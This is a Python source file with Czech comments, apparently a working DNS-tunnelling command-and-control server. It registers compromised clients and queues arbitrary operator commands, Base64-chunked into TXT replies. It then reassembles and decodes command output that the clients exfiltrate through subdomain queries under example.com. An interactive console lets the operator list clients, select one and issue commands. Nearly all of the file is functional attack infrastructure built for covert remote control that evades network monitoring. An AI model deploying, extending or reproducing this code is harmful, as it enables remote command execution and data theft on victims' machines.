#!/usr/bin/env python3
import socket
import base64
import threading
import time
import sys
import signal
import os
from datetime import datetime
from dnslib import DNSRecord, DNSHeader, QTYPE, RR, TXT, DNSQuestion, QTYPE

# --- Konfigurace ---
# !!! ZMĚNA ZDE: Nahraďte "0.0.0.0" skutečnou veřejnou IP adresou vašeho serveru !!!
LISTEN_IP = "VASE_VEREJNA_IP_ADRESA"  # <<<----------------------- ZADEJTE SEM SPRÁVNOU IP
LISTEN_PORT = 53
MAX_CHUNK_SIZE = 30 # Max délka datové části v TXT záznamu / části domény
DEBUG_MODE = False # Výchozí stav debug logování

# --- Globální proměnné ---
clients = {} # client_id -> {'last_seen': timestamp, 'ip': ip_address}
pending_commands = {} # client_id -> [(cmd_id, [parts]), ...]
command_results = {} # client_id -> {cmd_id: {'total': N, 'parts': {1: data, ...}, 'status': 'pending/receiving/completed/error', 'result': decoded_result}}
command_id_counter = 0
current_client = None
should_exit = False
udp_socket = None

# --- Pomocné funkce ---

def log_message(level, message):
    """Zaznamená zprávu s úrovní (INFO/DEBUG/ERROR/WARN) a časovým razítkem."""
    if level == "DEBUG" and not DEBUG_MODE:
        return
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")

def signal_handler(sig, frame):
    """Zpracuje signál ukončení (Ctrl+C)."""
    global should_exit, udp_socket
    if should_exit: return
    log_message("INFO", "Zachycen signál ukončení (Ctrl+C). Ukončuji server...")
    should_exit = True
    if udp_socket:
        try:
             temp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             target_ip_for_wakeup = LISTEN_IP if LISTEN_IP != "0.0.0.0" else "127.0.0.1"
             temp_sock.sendto(b'', (target_ip_for_wakeup, LISTEN_PORT))
             temp_sock.close()
             log_message("DEBUG", f"Odeslán 'budíček' na {target_ip_for_wakeup}:{LISTEN_PORT}")
        except Exception as e:
             log_message("WARN", f"Nepodařilo se poslat signál pro probuzení socketu: {e}")
             if udp_socket:
                 log_message("DEBUG", "Zavírám socket přímo.")
                 udp_socket.close()

def get_next_command_id():
    """Získá a inkrementuje globální ID příkazu."""
    global command_id_counter
    command_id_counter += 1
    return command_id_counter

def encode_command(command_text):
    """Zakóduje příkaz do Base64 a rozdělí na části."""
    try:
        encoded = base64.b64encode(command_text.encode('utf-8')).decode('ascii')
        parts = [encoded[i:i+MAX_CHUNK_SIZE] for i in range(0, len(encoded), MAX_CHUNK_SIZE)]
        log_message("DEBUG", f"Příkaz zakódován do Base64 ({len(encoded)} B) a rozdělen na {len(parts)} částí (max {MAX_CHUNK_SIZE} B/část)")
        return parts
    except Exception as e:
        log_message("ERROR", f"Chyba při kódování příkazu: {e}")
        return []

def find_client_id_by_ip(ip_address):
    """Najde ID klienta podle IP adresy."""
    found_clients = [cid for cid, data in clients.items() if data.get('ip') == ip_address]
    if len(found_clients) == 1:
        return found_clients[0]
    elif len(found_clients) > 1:
         log_message("WARN", f"Nalezena více než jedna registrace pro IP {ip_address}.")
    return None

# --- Zpracování DNS dotazů ---

def handle_dns_request(data, addr):
    """Zpracuje příchozí DNS dotaz."""
    global clients, pending_commands, command_results, udp_socket
    client_ip = addr[0]

    try:
        request = DNSRecord.parse(data)
        # Odstranit .lower() pro zachování velikosti písmen v datech
        qname = str(request.q.qname).rstrip('.')
        qname_lower = qname.lower() # Použít pro porovnání struktury
        qtype = request.q.qtype

        log_message("DEBUG", f"Přijat {QTYPE[qtype]} dotaz od {client_ip}: {qname}")

        response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply_txt = None
        client_id_for_logging = client_ip

        parts = qname.split('.') # Parsovat původní qname
        log_message("DEBUG", f"Rozparsované části qname: {parts}")

        if len(parts) >= 3 and qname_lower.endswith(".example.com"):
            command_type = parts[0].lower() # Porovnávat lowercase

            # 1. Registrace klienta
            if command_type == "register" and len(parts) >= 4:
                client_id = parts[1]; client_id_for_logging = client_id
                clients[client_id] = {'last_seen': time.time(), 'ip': client_ip}
                log_message("INFO", f"Klient '{client_id}' registrován/aktualizován z IP {client_ip}")
                reply_txt = "registered"

            # 2. Dotaz na příkaz
            elif command_type == "getcommand":
                actual_client_id = find_client_id_by_ip(client_ip)
                if actual_client_id:
                    client_id_for_logging = actual_client_id; clients[actual_client_id]['last_seen'] = time.time()
                else:
                    if len(clients) > 1: log_message("WARN", f"Dotaz na příkaz z IP {client_ip}, nelze jednoznačně přiřadit.")
                    elif not clients: log_message("WARN", f"Dotaz na příkaz z IP {client_ip}, žádný klient není registrován.")

                if actual_client_id and actual_client_id in pending_commands and pending_commands[actual_client_id]:
                     cmd_id, cmd_parts = pending_commands[actual_client_id][0]
                     if actual_client_id not in command_results: command_results[actual_client_id] = {}
                     if cmd_id not in command_results[actual_client_id]: command_results[actual_client_id][cmd_id] = {'status': 'pending', 'next_part_to_send': 1}
                     elif 'next_part_to_send' not in command_results[actual_client_id][cmd_id]: command_results[actual_client_id][cmd_id]['next_part_to_send'] = 1
                     part_num = command_results[actual_client_id][cmd_id]['next_part_to_send']; total_parts = len(cmd_parts)
                     if part_num <= total_parts:
                         data_part = cmd_parts[part_num - 1]; reply_txt = f"{cmd_id}|{part_num}|{total_parts}|{data_part}"
                         log_message("INFO", f"Odesílám část {part_num}/{total_parts} příkazu #{cmd_id} klientovi '{actual_client_id}'")
                         command_results[actual_client_id][cmd_id]['next_part_to_send'] = part_num + 1
                         if part_num == total_parts:
                             pending_commands[actual_client_id].pop(0);
                             if not pending_commands[actual_client_id]: del pending_commands[actual_client_id]
                             log_message("DEBUG", f"Poslední část příkazu #{cmd_id} odeslána."); command_results[actual_client_id][cmd_id]['status'] = 'sent'
                     else:
                          log_message("WARN", f"Pokus o odeslání neexistující části {part_num}/{total_parts}."); pending_commands[actual_client_id].pop(0)
                          if not pending_commands[actual_client_id]: del pending_commands[actual_client_id]; reply_txt = "nocommand"
                else:
                     reply_txt = "nocommand"
                     if actual_client_id: log_message("DEBUG", f"Žádný příkaz ve frontě pro '{actual_client_id}'")


            # 3. Příjem výsledku příkazu
            elif command_type == "response" and len(parts) >= 6:
                try:
                    cmd_id = int(parts[1])
                    part_num = int(parts[2])
                    total_parts = int(parts[3])
                    # Použít parts s původní velikostí písmen
                    data_part = parts[4]
                    log_message("DEBUG", f"Extrahovaná data část (parts[4]): '{data_part}'")

                    client_id = find_client_id_by_ip(client_ip)
                    if not client_id: client_id = client_ip; client_id_for_logging = f"Neznámý({client_ip})"
                    else: client_id_for_logging = client_id

                    if client_id:
                        if client_id not in command_results: command_results[client_id] = {}
                        # Oprava KeyError: Zajistit existenci všech potřebných klíčů
                        if cmd_id not in command_results[client_id]:
                            command_results[client_id][cmd_id] = {'total': total_parts, 'parts': {}, 'received_count': 0, 'status': 'receiving'}
                        else:
                            command_entry = command_results[client_id][cmd_id]
                            if 'parts' not in command_entry: command_entry['parts'] = {}
                            if 'received_count' not in command_entry: command_entry['received_count'] = 0
                            if command_entry.get('status') in ['pending', 'sent', None]: command_entry['status'] = 'receiving'
                            command_entry['total'] = total_parts

                        cmd_entry = command_results[client_id][cmd_id]

                        if part_num not in cmd_entry['parts']:
                            cmd_entry['parts'][part_num] = data_part
                            cmd_entry['received_count'] += 1
                            log_message("DEBUG", f"Přijata část {part_num}/{total_parts} od '{client_id_for_logging}'. Celkem: {cmd_entry['received_count']}")

                            if cmd_entry['received_count'] >= total_parts:
                                log_message("INFO", f"Všechny části ({total_parts}) výsledku příkazu #{cmd_id} od '{client_id_for_logging}' přijaty.")
                                assembled_b64 = "".join(cmd_entry['parts'].get(i, "") for i in range(1, total_parts + 1))
                                log_message("DEBUG", f"Sestavený Base64 k dekódování (před strip): '{assembled_b64}'")

                                try:
                                    cleaned_b64 = assembled_b64.strip()
                                    if not cleaned_b64:
                                         log_message("WARN", "Po odstranění bílých znaků nezůstala žádná Base64 data.")
                                         decoded_bytes = b''
                                    else:
                                         log_message("DEBUG", f"Base64 k dekódování (po strip): '{cleaned_b64}'")
                                         # Dekódovat Base64 (nyní by mělo fungovat)
                                         decoded_bytes = base64.b64decode(cleaned_b64)

                                    log_message("INFO", f"Přijaté surové bajty (prvních 50): {decoded_bytes[:50]}")

                                    # *** ZMĚNA: Dekódovat POUZE pomocí CP437 (nebo jiného, pokud je třeba) ***
                                    final_result = "<Chyba dekódování>" # Výchozí hodnota
                                    try:
                                        # Použít CP437, protože klient hlásil toto kódování
                                        final_result = decoded_bytes.decode('cp437', errors='replace')
                                        log_message("INFO", f"Výsledek příkazu #{cmd_id} pro '{client_id_for_logging}':\n------\n{final_result}\n------")
                                        cmd_entry['status'] = 'completed'
                                    except LookupError:
                                        log_message("ERROR", "Kódování cp437 není podporováno Pythonem! Zkuste jiné.")
                                        # Fallback na UTF-8 replace, pokud cp437 není k dispozici
                                        final_result = decoded_bytes.decode('utf-8', errors='replace')
                                        log_message("INFO", f"Výsledek příkazu #{cmd_id} (fallback UTF-8):\n------\n{final_result}\n------")
                                        cmd_entry['status'] = 'completed_fallback'
                                    except UnicodeDecodeError as ude:
                                        log_message("ERROR", f"Chyba při dekódování pomocí cp437 pro příkaz #{cmd_id}: {ude}")
                                        final_result = f"<Chyba dekódování cp437: {ude}>"
                                        cmd_entry['status'] = 'error'

                                    cmd_entry['result'] = final_result # Uložit výsledek
                                    if 'parts' in cmd_entry: del cmd_entry['parts'] # Uklidit

                                except Exception as decode_err: # Chyba např. v Base64
                                    log_message("ERROR", f"Chyba při dekódování Base64 pro příkaz #{cmd_id}: {decode_err}")
                                    cmd_entry['result'] = f"<Chyba dekódování Base64: {decode_err}>"; cmd_entry['status'] = 'error'
                        else:
                            log_message("DEBUG", f"Duplicitní část {part_num}/{total_parts} od '{client_id_for_logging}'.")

                        reply_txt = "ack"
                    else:
                         log_message("WARN", f"Přijat výsledek od neznámého klienta {client_ip}.")
                         return
                except (ValueError, IndexError) as e:
                    log_message("ERROR", f"Chyba při parsování 'response' dotazu od {client_ip}: {qname} - {e}")
                    return
            else:
                log_message("WARN", f"Neznámý formát dotazu v doméně example.com od {client_ip}: {qname}")
                return
        else:
            log_message("DEBUG", f"Ignoruji nesouvisející DNS dotaz od {client_ip} pro: {qname}")
            return

        if reply_txt:
            response.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(reply_txt))) # Použít původní qname
            try:
                if udp_socket and not should_exit:
                    udp_socket.sendto(response.pack(), addr)
                    log_message("DEBUG", f"Odeslána TXT odpověď '{reply_txt[:50]}...' na {client_ip}")
                elif not udp_socket: log_message("WARN", "Socket uzavřen před odesláním odpovědi.")
            except Exception as e:
                 if not should_exit: log_message("ERROR", f"Chyba při odesílání DNS odpovědi: {e}")

    except Exception as e:
        if not should_exit:
            log_message("ERROR", f"Neočekávaná chyba při zpracování dotazu od {addr}: {e}")
            import traceback; log_message("DEBUG", traceback.format_exc())


# --- Funkce serveru ---
def start_dns_server():
    global udp_socket
    log_message("INFO", "Spouštím DNS serverové vlákno...")
    try:
        if LISTEN_IP == "VASE_VEREJNA_IP_ADRESA": log_message("ERROR", "IP adresa LISTEN_IP nebyla nastavena!"); return
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        udp_socket.bind((LISTEN_IP, LISTEN_PORT)); log_message("INFO", f"DNS server naslouchá na {LISTEN_IP}:{LISTEN_PORT}")
        while not should_exit:
            try:
                udp_socket.settimeout(1.0)
                try:
                    data, addr = udp_socket.recvfrom(1024)
                    if should_exit: break
                    handle_dns_request(data, addr)
                except socket.timeout:
                    if should_exit: break
                    continue
            except socket.error as e:
                 if should_exit: log_message("INFO", "Socket byl uzavřen, ukončuji smyčku."); break
                 else: log_message("ERROR", f"Chyba socketu v hlavní smyčce: {e}"); time.sleep(1)
            except Exception as e:
                 if not should_exit: log_message("ERROR", f"Neočekávaná chyba v hlavní smyčce serveru: {e}"); import traceback; log_message("DEBUG", traceback.format_exc()); time.sleep(1)
    except PermissionError: log_message("ERROR", "Chyba oprávnění: Nelze naslouchat na portu 53. Spusťte s sudo.")
    except OSError as e:
         if e.errno == 98: log_message("ERROR", f"Chyba bindování {LISTEN_IP}:{LISTEN_PORT}: Adresa již používána."); log_message("INFO", "Zkontrolujte jiný DNS server/službu (systemd-resolved?).")
         else: log_message("ERROR", f"Chyba bindování {LISTEN_IP}:{LISTEN_PORT}: {e}")
    except Exception as e: log_message("ERROR", f"Fatální chyba startu: {e}"); import traceback; log_message("DEBUG", traceback.format_exc())
    finally:
        if udp_socket: log_message("DEBUG", "Zavírám UDP socket."); udp_socket.close(); udp_socket = None
        log_message("INFO", "DNS serverové vlákno ukončeno.")

def list_clients():
    if not clients: print("[-] Žádní klienti nejsou připojeni."); return
    print("[*] Seznam připojených klientů:"); now = time.time(); client_list = sorted(clients.items())
    for client_id, data in client_list:
        last_seen_ago = int(now - data.get('last_seen', 0)); client_ip = data.get('ip', 'N/A')
        print(f"  - ID: {client_id}, IP: {client_ip}, Naposledy: {last_seen_ago}s")

def send_command(client_id, command_text):
    global pending_commands, command_results; actual_client_id = None
    if client_id in clients: actual_client_id = client_id
    else:
        for cid, data in clients.items():
             if data.get('ip') == client_id: actual_client_id = cid; break
    if not actual_client_id: print(f"[!] Chyba: Klient s ID/IP '{client_id}' nenalezen."); return
    cmd_parts = encode_command(command_text)
    if not cmd_parts: print(f"[!] Chyba: Nepodařilo se zakódovat příkaz."); return
    cmd_id = get_next_command_id()
    if actual_client_id not in pending_commands: pending_commands[actual_client_id] = []
    pending_commands[actual_client_id].append((cmd_id, cmd_parts))
    print(f"[*] Příkaz #{cmd_id} ('{command_text[:30]}...') přidán do fronty pro '{actual_client_id}'.")
    if actual_client_id not in command_results: command_results[actual_client_id] = {}
    if cmd_id not in command_results[actual_client_id]: command_results[actual_client_id][cmd_id] = {'status': 'pending', 'command_text': command_text, 'next_part_to_send': 1}
    else: log_message("DEBUG",f"Záznam pro příkaz #{cmd_id} už existuje.")

def print_server_status():
    global DEBUG_MODE; print("\n--- Stav serveru ---"); print(f"Naslouchám na: {LISTEN_IP}:{LISTEN_PORT}"); print(f"Debug mód: {'Zapnutý' if DEBUG_MODE else 'Vypnutý'}"); list_clients()
    print("\nPříkazy ve frontě:"); pending_cmd_count = sum(len(cmds) for cmds in pending_commands.values())
    if pending_cmd_count == 0: print("  Žádné příkazy ve frontě.")
    else:
        for cid, cmds in pending_commands.items():
             if cmds: print(f"  Klient '{cid}': {len(cmds)} příkazů")
    print("\nStav zpracování příkazů:"); status_counts = {'completed': 0, 'pending': 0, 'receiving': 0, 'error': 0, 'sent': 0, 'completed_fallback': 0}; total_cmd_records = 0; client_details = []
    for cid, results in command_results.items():
         client_statuses = {'completed': 0, 'pending': 0, 'receiving': 0, 'error': 0, 'sent': 0, 'completed_fallback': 0}; has_any_status = False
         for cmd_data in results.values():
             status = cmd_data.get('status', 'unknown')
             if status in client_statuses: client_statuses[status] += 1; status_counts[status] += 1; has_any_status = True
             elif status == 'completed_fallback': client_statuses['completed_fallback'] += 1; status_counts['completed_fallback'] += 1; has_any_status = True # Speciální stav
         if has_any_status: client_details.append(f"  Klient '{cid}': {client_statuses['completed']} dokončeno, {client_statuses['pending']} čeká, {client_statuses['sent']} odesláno, {client_statuses['receiving']} přijímáno, {client_statuses['error']} chyb, {client_statuses['completed_fallback']} fallback"); total_cmd_records += len(results)
    if total_cmd_records == 0: print("  Zatím žádné záznamy o příkazech.")
    else:
         for detail in sorted(client_details): print(detail)
    print("--------------------\n")

# --- Hlavní funkce a UI ---
def main():
    global current_client, should_exit, DEBUG_MODE
    if LISTEN_IP == "VASE_VEREJNA_IP_ADRESA": print("-" * 60); print("[FATAL] IP adresa serveru (LISTEN_IP) není nastavena!"); print("        Upravte proměnnou LISTEN_IP v horní části skriptu."); print("-" * 60); sys.exit(1)
    signal.signal(signal.SIGINT, signal_handler)
    server_thread = threading.Thread(target=start_dns_server, daemon=True, name="DNSServerThread"); server_thread.start(); time.sleep(0.5)
    if not server_thread.is_alive(): log_message("ERROR", "Serverové vlákno se nespustilo nebo se okamžitě ukončilo."); sys.exit(1)
    print("\n[*] Reverzní C2 server spuštěn."); print("[*] Zadejte 'help' pro seznam příkazů.")
    while not should_exit:
        try:
            if not server_thread.is_alive(): log_message("ERROR", "Serverové vlákno neočekávaně skončilo."); should_exit = True; break
            prompt = f"C2 Server ({current_client if current_client else 'Žádný klient'})> "; cmd_input = input(prompt).strip()
            if not cmd_input: continue
            if cmd_input.lower() == "list": list_clients()
            elif cmd_input.lower().startswith("use "):
                target_client = cmd_input[4:].strip(); actual_client_id = None
                if target_client in clients: actual_client_id = target_client
                else:
                    for cid, data in clients.items():
                        if data.get('ip') == target_client: actual_client_id = cid; break
                if actual_client_id: current_client = actual_client_id; print(f"[*] Přepnuto na klienta '{current_client}'")
                else: print(f"[!] Chyba: Klient s ID/IP '{target_client}' nenalezen.")
            elif cmd_input.lower() == "debug": DEBUG_MODE = not DEBUG_MODE; print(f"[*] Debug mód {'zapnut' if DEBUG_MODE else 'vypnut'}.")
            elif cmd_input.lower() == "exit": print("[*] Ukončování serveru..."); should_exit = True; signal_handler(None, None); break
            elif cmd_input.lower() == "help": print("\nDostupné příkazy:"); print("  list          - Zobrazit seznam připojených klientů."); print("  use <id/ip>   - Vybrat klienta pro zadávání příkazů."); print("  back          - Zrušit výběr klienta."); print("  debug         - Přepnout debug logování (Zap/Vyp)."); print("  status        - Zobrazit aktuální stav serveru a klientů."); print("  exit          - Ukončit server."); print("  help          - Zobrazit tuto nápovědu."); print("  <příkaz>      - Odeslat příkaz vybranému klientovi (pokud je vybrán).")
            elif cmd_input.lower() == "back":
                if current_client: print(f"[*] Výběr klienta '{current_client}' zrušen."); current_client = None
                else: print("[!] Žádný klient není vybrán.")
            elif cmd_input.lower() == "status": print_server_status()
            else:
                if current_client: send_command(current_client, cmd_input)
                else: print("[!] Příkaz nerozpoznán nebo není vybrán klient.")
        except (EOFError, KeyboardInterrupt): print("\n[*] Ukončování serveru (Ctrl+D/C)..."); should_exit = True; signal_handler(None, None); break
        except Exception as e: log_message("ERROR", f"Chyba v hlavní smyčce UI: {e}"); import traceback; log_message("DEBUG", traceback.format_exc())
    log_message("INFO", "Čekání na ukončení serverového vlákna (max 2s)..."); server_thread.join(timeout=2.0)
    if server_thread.is_alive(): log_message("WARN", "Serverové vlákno se neukončilo.")
    else: log_message("INFO", "Serverové vlákno ukončeno.")
    print("[*] Server byl ukončen."); sys.exit(0)

if __name__ == "__main__":
    main()